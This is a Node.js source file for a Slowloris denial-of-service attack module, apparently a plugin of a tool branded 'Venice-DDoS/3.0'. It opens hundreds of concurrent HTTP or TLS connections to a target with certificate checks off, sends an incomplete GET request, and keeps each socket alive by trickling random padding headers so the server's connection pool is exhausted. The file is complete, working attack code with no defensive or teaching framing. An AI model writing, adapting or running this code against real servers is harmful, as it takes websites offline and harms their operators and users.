'use strict';
const net = require('net');
const tls = require('tls');

module.exports = {
  name: 'SLOWLORIS',
  layer: 7,
  summary: 'Holds hundreds of half-open HTTP sockets, trickling header pads to exhaust the accept queue.',
  defaults: { concurrency: 500, slowInterval: 1500 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const sockets = new Set();
    const interval = Math.max(100, Number(opts.slowInterval) || 1500);

    const dial = () =>
      target.secure
        ? tls.connect({ host: target.host, port: target.port, rejectUnauthorized: false, servername: target.host })
        : net.connect({ host: target.host, port: target.port });

    return {
      async worker() {
        while (ctx.running) {
          await new Promise((resolve) => {
            const sock = dial();
            sockets.add(sock);
            stats.open();

            let settled = false;
            let armed = false;
            let timer = null;

            const finish = (err) => {
              if (settled) return;
              settled = true;
              if (timer) clearInterval(timer);
              sockets.delete(sock);
              stats.close();
              if (err) stats.err(); else stats.hit(0);
              try { sock.destroy(); } catch {}
              resolve();
            };

            const arm = () => {
              if (armed) return;
              armed = true;
              sock.write(
                `GET ${target.path} HTTP/1.1\r\n` +
                `Host: ${target.hostHeader}\r\n` +
                `User-Agent: ${opts.userAgent || 'Venice-DDoS/3.0'}\r\n` +
                `Accept: */*\r\n`
              );
              timer = setInterval(() => {
                if (!sock.writable) return;
                try {
                  sock.write(`X-Pad-${Date.now().toString(36)}: ${Math.random().toString(36).slice(2)}\r\n`);
                } catch {}
              }, interval);
            };

            sock.once('connect', arm);
            if (target.secure) sock.once('secureConnect', arm);
            sock.on('error', () => finish(new Error('sock')));
            sock.on('close', () => finish(null));
            sock.on('end', () => finish(null));
            sock.setTimeout(0);
          });
        }
      },
      destroy() { for (const s of sockets) { try { s.destroy(); } catch {} } },
    };
  },
};
